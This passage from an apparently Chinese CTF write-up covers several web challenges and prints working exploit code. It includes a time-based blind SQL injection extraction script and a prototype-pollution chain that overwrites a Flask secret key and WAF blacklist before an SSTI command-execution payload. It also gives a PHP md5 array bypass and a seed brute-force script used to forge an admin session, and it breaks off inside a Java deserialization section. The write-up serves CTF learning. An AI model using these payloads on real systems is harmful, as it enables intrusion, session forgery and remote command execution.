time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">                name += j</span><br><span class=\"line\">                time.sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> name</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 当前数据库的表有2</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tb_count</span>():</span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;g01den&#x27;/**/Or/**/if((select/**/count(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">        data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">        <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;当前数据库的表有&quot;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 因为测出来有两个表，所以需要查两次</span></span><br><span class=\"line\"><span class=\"comment\"># 当前数据库表名长度为36</span></span><br><span class=\"line\"><span class=\"comment\"># 当前数据库表名长度为8</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tb_name_len</span>():</span><br><span class=\"line\">    i = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;g01den&#x27;/**/Or/**/if((select/**/length(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">        data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">        <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;当前数据库表名长度为&quot;</span> + <span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 因为存在两张表，所以得查两次</span></span><br><span class=\"line\"><span class=\"comment\"># flag_is_in_flag1shere_loockhere_flag</span></span><br><span class=\"line\"><span class=\"comment\"># flag</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tb_name</span>():</span><br><span class=\"line\">    name = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">37</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> alpha:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(table_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i,j)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">            <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(j,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">                name += j</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> name</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数据库的数据个数为1</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">flag_count</span>():</span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;g01den&#x27;/**/or/**/if((select/**/count(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">        data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;数据库的数据个数为&quot;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># flag的长度为32</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">flag_name_len</span>():</span><br><span class=\"line\">    i = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;g01den&#x27;/**/or/**/if((select/**/length(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">        data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;flag的长度为&quot;</span> + <span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hectf&#123;fl4g_1s_h5r5_n1ce_try_4_u&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">flag_get</span>():</span><br><span class=\"line\">    flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">34</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> alpha:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;g01den&#x27;/**/or/**/if((select/**/substr(flag,&#123;&#125;,1)/**/from/**/flag1shere.lookhere)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i,j)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">                flag += j</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># db_name_len()</span></span><br><span class=\"line\"><span class=\"comment\"># db_name()</span></span><br><span class=\"line\"><span class=\"comment\"># db_name_count()</span></span><br><span class=\"line\"><span class=\"comment\"># db_name_len_list()</span></span><br><span class=\"line\"><span class=\"comment\"># db_name_list()</span></span><br><span class=\"line\"><span class=\"comment\"># tb_count()</span></span><br><span class=\"line\"><span class=\"comment\"># tb_name_len()</span></span><br><span class=\"line\"><span class=\"comment\"># tb_name()</span></span><br><span class=\"line\"><span class=\"comment\"># flag_count()</span></span><br><span class=\"line\"><span class=\"comment\"># flag_name_len()</span></span><br><span class=\"line\"><span class=\"comment\"># flag_get()</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t直接跑最后一个函数就可以得到 flag，但是时间会很长，其他的是为了让这个题有始有终，尽可能获得更多的数据。</p>\n<h3 id=\"你一个人专属的进货网站\"><a class=\"markdownIt-Anchor\" href=\"#你一个人专属的进货网站\">#</a> 你一个人专属的进货网站：</h3>\n<p>​\t\t看到 <code>#pip install -v pydash==5.1.2</code>  知是原型链污染。</p>\n<p>​\t\tadmin 路由中存在 ssti，想进去需要伪造 session。setUserInfo 路由存在原型链污染，抓包改参数，先污染 key，之后污染 WAF 文件里的 blacklist，之后污染 user 对象里的 username 或者 setUserInfo 改名进行 ssti。</p>\n<p>​\t\t这里贴一下大佬的 poc：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"> url = <span class=\"string\">&#x27;8.153.107.251:32109&#x27;</span></span><br><span class=\"line\"> login_url = <span class=\"string\">f&#x27;http://<span class=\"subst\">&#123;url&#125;</span>/login&#x27;</span></span><br><span class=\"line\"> setUserInfo_url = <span class=\"string\">f&#x27;http://<span class=\"subst\">&#123;url&#125;</span>/setUserInfo&#x27;</span></span><br><span class=\"line\"> admin_url = <span class=\"string\">f&#x27;http://<span class=\"subst\">&#123;url&#125;</span>/admin&#x27;</span></span><br><span class=\"line\"> username = <span class=\"string\">&quot;[[g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()]]&quot;</span></span><br><span class=\"line\"> password = <span class=\"string\">&quot;lbz&quot;</span></span><br><span class=\"line\"> login_data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;username&#x27;</span>: username,</span><br><span class=\"line\">    <span class=\"string\">&#x27;password&#x27;</span>: password</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> response0 = requests.post(login_url, data=login_data)</span><br><span class=\"line\"> setUserInfo_data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;key&#x27;</span>: <span class=\"string\">&quot;.__init__.__globals__.app.config.SECRET_KEY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;value&#x27;</span>: <span class=\"string\">&quot;123&quot;</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> response1 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class=\"line\"> setUserInfo_data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;key&#x27;</span>: <span class=\"string\">&quot;.__init__.__globals__.app.jinja_env.variable_start_string&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;value&#x27;</span>: <span class=\"string\">&quot;[[&quot;</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> response2 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class=\"line\"> setUserInfo_data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;key&#x27;</span>: <span class=\"string\">&quot;.__init__.__globals__.app.jinja_env.variable_end_string&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;value&#x27;</span>: <span class=\"string\">&quot;]]&quot;</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> response3 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class=\"line\"> setUserInfo_data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;key&#x27;</span>: <span class=\"string\">&quot;.__init__.__globals__.WAF.blacklist&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;value&#x27;</span>: <span class=\"string\">&quot;%&quot;</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">response4 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class=\"line\"> session = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;Enter the session cookie: &quot;</span>)</span><br><span class=\"line\"> cookies = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;session&#x27;</span>: session</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> response5 = requests.get(admin_url, cookies=cookies)</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(response5.text)</span><br></pre></td></tr></table></figure>\n<p>​\t\tsession 伪造可以用 flask_session_cookie_manager 。</p>\n<h3 id=\"ezweb\"><a class=\"markdownIt-Anchor\" href=\"#ezweb\">#</a> ezweb</h3>\n<p>​\t\t查看源码，得到 base64 解密数据：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>] != <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>]) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>] != <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;d&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;d&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) === <span class=\"string\">&#x27;aa476cf7143fe69c29b36e4d0a793604&#x27;</span>) &#123; <span class=\"comment\">//xxxxx2024</span></span><br><span class=\"line\">            <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&quot;secret.php&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t传入这个绕过前两层</p>\n<blockquote>\n<p>?a[]=a&amp;b[]=b&amp;c[]=c&amp;d[]=d</p>\n</blockquote>\n<p>​\t\t之后的 guess 撞库获得 hECTf2024。得到 secret.php 文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//mt_srand(rand(1e5,1e7));</span></span><br><span class=\"line\"><span class=\"comment\">//$key = rand();</span></span><br><span class=\"line\"><span class=\"comment\">//file_put_contents(*,$key);</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session_decrypt</span>(<span class=\"params\"><span class=\"variable\">$session</span>,<span class=\"variable\">$key</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$data</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$session</span>);</span><br><span class=\"line\">    <span class=\"variable\">$method</span> = <span class=\"string\">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$iv_size</span> = <span class=\"title function_ invoke__\">openssl_cipher_iv_length</span>(<span class=\"variable\">$method</span>);</span><br><span class=\"line\">    <span class=\"variable\">$iv</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$data</span>,<span class=\"number\">0</span>,<span class=\"variable\">$iv_size</span>);</span><br><span class=\"line\">    <span class=\"variable\">$enc</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$data</span>,<span class=\"variable\">$iv_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">openssl_decrypt</span>(<span class=\"variable\">$enc</span>, <span class=\"variable\">$method</span>, <span class=\"variable\">$key</span>, <span class=\"number\">1</span>, <span class=\"variable\">$iv</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t看出来加密算法，AES-256-CBC，key 为随机生成的，种子也是随机生成的，得爆破，贴个大佬的脚本：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">100000</span>; <span class=\"variable\">$i</span> &lt; <span class=\"number\">10000000</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mt_srand</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">rand</span>();</span><br><span class=\"line\">    <span class=\"variable\">$session</span> = <span class=\"string\">&quot;ja59o5qBBFlXzx7hHeauqrsXPoilxIhW%2F5Aq9CFdqF1kGFHBVjb7TvMlEfZwG5eBukjNbEQSV9VKTLuZevUwJuX2LZ7qc9lu22V%2B368YSXWwoHTWlM9XFUY9jWip3pUo&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$session</span> = <span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$session</span>);</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">session_decrypt</span>(<span class=\"variable\">$session</span>, <span class=\"variable\">$key</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$result</span> !== <span class=\"literal\">false</span> <span class=\"keyword\">and</span> <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/guest|admin/i&quot;</span>, <span class=\"variable\">$result</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">解密成功！解密后的数据</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> . (<span class=\"variable\">$result</span>) . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Key:&quot;</span>.<span class=\"variable\">$key</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;srand:&quot;</span>.<span class=\"variable\">$i</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session_decrypt</span>(<span class=\"params\"><span class=\"variable\">$session</span>, <span class=\"variable\">$key</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$data</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$session</span>);</span><br><span class=\"line\">    <span class=\"variable\">$method</span> = <span class=\"string\">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$iv_size</span> = <span class=\"title function_ invoke__\">openssl_cipher_iv_length</span>(<span class=\"variable\">$method</span>);</span><br><span class=\"line\">    <span class=\"variable\">$iv</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$data</span>, <span class=\"number\">0</span>, <span class=\"variable\">$iv_size</span>);</span><br><span class=\"line\">    <span class=\"variable\">$enc</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$data</span>, <span class=\"variable\">$iv_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">openssl_decrypt</span>(<span class=\"variable\">$enc</span>, <span class=\"variable\">$method</span>, <span class=\"variable\">$key</span>, <span class=\"number\">1</span>, <span class=\"variable\">$iv</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>解密成功！解密后的数据<br>\n O:4:“User”:2:{s:8:“username”;s:5:“guest”;s:4:“role”;s:5:“guest”;}<br>\nKey:1728818262<br>\nsrand:8168720</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$res</span>=<span class=\"title function_ invoke__\">session_encrypt</span>(<span class=\"string\">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>,<span class=\"number\">1728818262</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session_encrypt</span>(<span class=\"params\"><span class=\"variable\">$data</span>, <span class=\"variable\">$key</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$method</span> = <span class=\"string\">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$iv_size</span> = <span class=\"title function_ invoke__\">openssl_cipher_iv_length</span>(<span class=\"variable\">$method</span>);</span><br><span class=\"line\">    <span class=\"variable\">$iv</span> = <span class=\"title function_ invoke__\">openssl_random_pseudo_bytes</span>(<span class=\"variable\">$iv_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">bin2hex</span>(<span class=\"variable\">$iv</span>).<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$encrypted</span> = <span class=\"title function_ invoke__\">openssl_encrypt</span>(<span class=\"variable\">$data</span>, <span class=\"variable\">$method</span>, <span class=\"variable\">$key</span>, <span class=\"number\">1</span>, <span class=\"variable\">$iv</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">bin2hex</span>(<span class=\"variable\">$encrypted</span>).<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$encoded</span> = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$iv</span> . <span class=\"variable\">$encrypted</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$encoded</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$res</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#DWuzth9WfI2ufPUB5nI99CQuFk4nBqn8g3cvtJfSb5E4wnC+d4sICqt3hONji9RbclgNtgPZLkKQPSvO6e6INHudhIc9ofgj4GYs/6mZWx+jLaaqV+5jQLCvvGtfLLD2</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后得到了 flag。</p>\n<h3 id=\"ezjava\"><a class=\"markdownIt-Anchor\" href=\"#ezjava\">#</a> ezjava：</h3>\n<p>​\t\t不会 java，所以先抄一遍学长的 wp，之后再学习下  (╥_╥)</p>\n<p>​\t\t通过附件中的 jar 包可以看出有，CC3.2.1、vaadin 依赖，推测是用 vaadin 的链子。</p>\n<p>​\t\t通过反编译 jar 包的 IndexController：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.easyjava.Controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.easyjava.challenge.MyObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.easyjava.challenge.normal;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayInputStream;</span><br><span 